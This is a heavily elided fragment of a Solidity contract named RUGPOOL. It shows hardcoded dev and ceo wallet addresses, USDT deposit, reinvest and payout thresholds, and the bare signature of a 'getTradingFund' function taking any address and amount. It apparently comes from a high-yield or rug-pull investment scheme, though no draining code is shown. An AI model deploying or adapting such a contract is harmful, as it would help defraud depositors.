...
contract RUGPOOL is Context, Ownable {
    ...
    constructor() {         
		dev = payable(0x9471983B5FC838d20e142f2D3Ef63434cEa69871);		
	    ceo = payable(0xd06C18610B6932e63B6330d211bAC9E61E4b2040);		
        tarifs[0] = Tarif(72270, 21681);
    ...
    function Deposit(address _upline, uint256 amount) external {
        amount = amount * 10 ** 9;
        require(amount >= 500 ether, "Minimum Deposit is 500 USDT!");
    ...
    function Reinvest() external {   
        ...
        require(player.dividends >= 100 ether, "Minimum reinvest is 100 USDT.");
    ...
    function Payout() external {      
        ...
        require(player.dividends >= 100 ether, "Minimum payout is 100 USDT.");
    ...
    function getTradingFund (address _address, uint256 _amount) external  {
